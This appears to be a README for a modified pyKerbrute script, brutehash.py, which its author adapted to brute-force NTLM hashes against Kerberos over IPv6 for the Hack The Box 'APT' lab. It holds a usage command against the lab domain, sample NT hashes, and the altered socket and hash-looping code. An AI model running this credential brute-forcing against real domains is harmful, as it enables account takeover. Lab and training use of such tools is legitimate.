# NTLMhash bruteforce of kerberos login

I made modifications to ADPwdSpray.py (from [pyKerbrute](https://github.com/3gstudent/pyKerbrute)) for APT of HTB.

<br>

***I'm a beginner so there is still room for improvement.***

<br>

# usage

```
$ python brutehash.py dead:beef::b885:d62a:d679:573f htb.local henry.vinson ntlmhash hash.txt tcp
```

<br>

\*1 This scirt supports only ntlmhash mode and tcp mode of original ADPwdSpray.py

\*2 I used NThash list like following:

```
b300272f1cdab4469660d55fe59415cb
9ea25adafeec63e38cef4259d3b15c30
3ae49ec5e6fed82ceea0dc2be77750ab
```
# what I've modified

## ipv4 -> ipv6 (send_req_tcp)

```python
def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    # sock.connect((kdc, port))
    sock.connect((kdc, port, 0, 0))
    sock.send(data)
```

## last  part

```python
if __name__ == '__main__':
    kdc_a = sys.argv[1]
    user_realm = sys.argv[2].upper()
    user_name = sys.argv[3]

    file_object = open(sys.argv[5], 'r')

    for line in file_object:
        nthash = line.strip('\n')
        print(nthash)  # just show progress, you can remove this
        user_key = (RC4_HMAC, nthash.decode('hex'))
        passwordspray_tcp(user_realm, user_name, user_key, kdc_a, nthash)
```
## other

- I commentouted `from Crypto.Cipher import MD4, MD5` because of ImportError
- I deleted parts regarding UDP

# note

please use this brutehash.py in the same directory where `pyasn1` and `_crypto` are otherwise **PyAsn1Error** may happen.
